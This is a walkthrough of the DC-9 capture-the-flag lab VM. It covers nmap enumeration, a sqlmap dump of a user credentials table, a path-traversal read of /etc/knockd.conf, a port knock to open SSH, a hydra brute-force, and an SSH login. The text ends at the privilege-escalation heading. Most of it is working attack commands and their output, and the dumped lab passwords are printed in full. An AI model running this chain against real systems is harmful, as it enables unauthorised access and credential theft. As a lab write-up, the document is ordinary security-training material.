# DC - 09 Walkthrough

## Enumeration

### Nmap

```sh
┌──(kali㉿kali)-[~/Desktop/wallthrough]
└─$ sudo nmap 192.168.182.134 -sSCV 

Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-07 23:20 PST
Nmap scan report for 192.168.182.134
Host is up (0.0026s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-title: Example.com - Staff Details - Welcome
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:C7:FE:46 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
```

## Exploitation

```sh
┌──(kali㉿kali)-[~/Desktop/dc09]
└─$ sqlmap -r search.txt --dbs

[...]

[23:05:50] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] Staff
[*] users
```

Get all record from `users` database:

```sh
┌──(kali㉿kali)-[~/Desktop/dc09]
└─$ sqlmap -r search.txt -D users --dump-all    

[...]

Database: users
Table: UserDetails
[17 entries]
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+

[23:07:16] [INFO] table 'users.UserDetails' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.182.134/dump/users/UserDetails.csv'
```

Got the username and password. Now I extract them from CSV file, using Python script:

```
import csv

file_path = "/home/kali/.local/share/sqlmap/output/192.168.182.134/dump/users/UserDetails.csv"

f = open(file_path, 'r')
f_username = open('usernames.txt', 'w')
f_password = open('password.txt', 'w')

csv_reader = csv.DictReader(f)
row_number = 0

for row in csv_reader:
        if row_number == 0:
                row_number += 1
        else:
                row_number += 1
                username = row['username']
                password = row['password']
                f_username.write(username + "\n")
                f_password.write(password + "\n")
```

The target is block SSH port. So I find the way to cause it allows to connect to my exploit machine. I got this: https://www.unixmen.com/knockd-detailed-simpler/

Check the `knocd.conf` on uri `/manage.php?file=../../../../../etc/knockd.conf`:  

```
[options]
	UseSyslog

[openSSH]
	sequence    = 7469,8475,9842
	seq_timeout = 25
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9842,8475,7469
	seq_timeout = 25
	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn
```

Got the sequence number. Now run knock on Kali and re-scan port:

```sh
┌──(kali㉿kali)-[~/Desktop/wallthrough]
└─$ knock 192.168.182.134 7469 8475 9842

┌──(kali㉿kali)-[~/Desktop/wallthrough]
└─$ sudo nmap 192.168.182.134 -sSCV     
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-07 23:24 PST
Nmap scan report for 192.168.182.134
Host is up (0.000037s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2b3387432740bc516dc13decb9b8ac3 (RSA)
|   256 065c93871554686b889155cff89ace40 (ECDSA)
|_  256 e42c88da8863268c93d5f7632ba3ebab (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome
MAC Address: 00:0C:29:C7:FE:46 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

Now SSH port is opened. Using `usernames.txt` and `password.txt` to try logging to target via ssh:

```sh
┌──(kali㉿kali)-[~/Desktop/wallthrough]
└─$ hydra -L usernames.txt -P password.txt 192.168.182.134 ssh
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-07 23:26:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 256 login tries (l:16/p:16), ~16 tries per task
[DATA] attacking ssh://192.168.182.134:22/
[22][ssh] host: 192.168.182.134   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.182.134   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.182.134   login: janitor   password: Ilovepeepee
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-07 23:27:16
```

Got the valid credentials. SSH to target:

```sh
┌──(kali㉿kali)-[~/Desktop/wallthrough]
└─$ ssh janitor@192.168.182.134    
The authenticity of host '192.168.182.134 (192.168.182.134)' can't be established.
ED25519 key fingerprint is SHA256:QqKiAU3zrowiN9K1SVvmSWvLBZAqdSpT0aMLTwGlyvo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.182.134' (ED25519) to the list of known hosts.
janitor@192.168.182.134's password: 
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
janitor@dc-9:~$ 
```

## Privilege Escalation